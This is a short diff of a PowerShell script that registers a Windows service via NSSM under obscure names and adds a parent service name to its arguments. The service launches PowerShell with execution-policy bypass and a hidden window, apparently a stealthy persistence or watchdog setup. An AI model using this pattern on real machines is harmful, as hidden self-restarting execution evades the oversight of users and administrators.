@@ -36,9 +36,10 @@ if(($rootPath -eq $null) -or ($rootPath -eq "")){
 $serviceName = "Lugubrious"
 $childServiceName = "Peregrinate"
 $childServicePropertyName = "root"
+$parentServiceName = "Exsanguinate"
 $parentServicePropertyName = "rootMonMon"
 $exePath = "powershell.exe"
-$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath' -childServiceName $childServiceName -childServicePropertyName $childServicePropertyName -parentServicePropertyName $parentServicePropertyName"
+$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath' -childServiceName $childServiceName -childServicePropertyName $childServicePropertyName -parentServiceName $parentServiceName -parentServicePropertyName $parentServicePropertyName"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
     New-Item -Path $nssmFolder -ItemType Directory -Force
